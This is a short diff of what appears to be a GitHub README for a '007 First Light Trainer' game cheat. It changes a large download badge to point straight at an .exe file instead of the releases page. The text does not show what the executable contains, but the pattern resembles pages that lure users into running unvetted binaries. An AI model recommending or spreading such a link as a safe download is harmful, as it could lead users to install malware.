@@ -10,7 +10,7 @@
 <img width="1275" height="791" alt="image" src="https://github.com/user-attachments/assets/9fb37ccd-b77b-4180-9e56-fe523c98489f" />
 
 <div align="center">
-  <a href="https://github.com/cytan544-spec/007-First-Light-Trainer/releases/latest">
+  <a href="https://github.com/cytan544-spec/007-First-Light-Trainer/releases/download/007-First-Light-Trainer/007FirstLightTrainer.exe">
     <img src="https://img.shields.io/badge/↓_DOWNLOAD_LATEST_VERSION-0066FF?style=for-the-badge&logo=cloud-download&logoColor=white&color=0066FF&size=large" 
          alt="Download Latest Version" 
          height="70">
